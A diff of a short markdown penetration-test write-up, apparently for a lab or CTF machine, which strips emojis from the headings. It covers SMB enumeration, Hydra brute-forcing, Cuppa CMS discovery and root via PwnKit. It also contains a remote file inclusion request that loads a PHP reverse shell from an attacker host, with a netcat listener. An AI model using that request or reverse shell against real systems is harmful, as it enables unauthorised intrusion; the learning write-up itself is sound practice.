@@ -1,6 +1,6 @@
-# 🐿️ SquirrelMail 
+ SquirrelMail 
 
-## 🕵️ 1. Recon 
+ 1. Recon 
 - Port and service scanning: `nmap`
 - Directory/file brute-forcing: `dirsearch`, `gobuster`
 - Discovered **SquirrelMail**
@@ -11,7 +11,7 @@
 
 ---
 
-## 🔑 2. Access & Authentication (self)
+ 2. Access & Authentication (self)
 - Used **Hydra** for brute-forcing (usernames from `enum4linux` + `smbmap`)
 - Verified login endpoint with **Burp Suite**
 - Found valid passwords → logged into SMB with another user
@@ -19,17 +19,17 @@
 
 ---
 
-## 🌐 3. Web exploitation path (self)
+ 3. Web exploitation path (self)
 - Navigated to the hidden directory → initially empty
 - Ran `ffuf` → found `/administrator/`
 - Identified **Cuppa CMS**
 - Searched for exploits → found RFI vulnerability in `alertConfigField.php`
 
-📌 Exploit request:
+Exploit request:
 ```http
 GET /administrator/alerts/alertConfigField.php?urlConfig=http://ip_addres:8080/php-reverse-shell.php
 and use comand nc -nlvp 8080
-🛠️ 4. Privilege Escalation (self)
+ 4. Privilege Escalation (self)
 
 Ran linpeas.sh
 
@@ -39,13 +39,13 @@ Exploited PwnKit → privilege escalation successful
 
 Result: root access
 
-📖 5. Guided steps
+ 5. Guided steps
 
 After finding SquirrelMail, I followed a walkthrough for orientation
 
 Everything else (SMB, ffuf, Cuppa CMS, reverse shell, PwnKit) was done independently
 
-📝 6. Notes & Takeaways
+ 6. Notes & Takeaways
 
 With SMB, always run enum4linux + smbmap → often reveals users and useful files
 
